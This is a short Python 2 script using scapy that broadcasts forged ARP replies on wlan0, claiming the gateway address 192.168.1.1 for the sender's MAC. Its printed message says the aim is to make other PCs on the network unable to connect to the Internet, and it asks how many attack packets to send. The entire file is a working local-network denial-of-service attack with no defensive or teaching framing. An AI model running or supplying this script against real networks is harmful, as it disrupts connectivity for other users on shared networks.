#!/usr/bin/env python
import sys
import time
import os
from scapy.all import (get_if_hwaddr,getmacbyip,ARP,Ether,sendp)

if os.geteuid()!=0:
	print "Please run this script by signing in as ROOT!!"
	exit()

print "This script will broadcast ARP package making other PC can not connect to the Internet."
count = input("How many packets you want to attack? (Integer please):") 
#mac_attack = getmacbyip(ip_attack)
ip_src = "192.168.1.1"
mac_src = get_if_hwaddr("wlan0")
skt=Ether(src = mac_src, dst = "ff:ff:ff:ff:ff:ff") / ARP(hwsrc = mac_src , psrc=ip_src, op=2)
skt.show()
k=0
while k<count:
	sendp(skt, inter=2, iface="wlan0")
	time.sleep(0.5)
	k+=1
print "send",count,"packets."
exit()

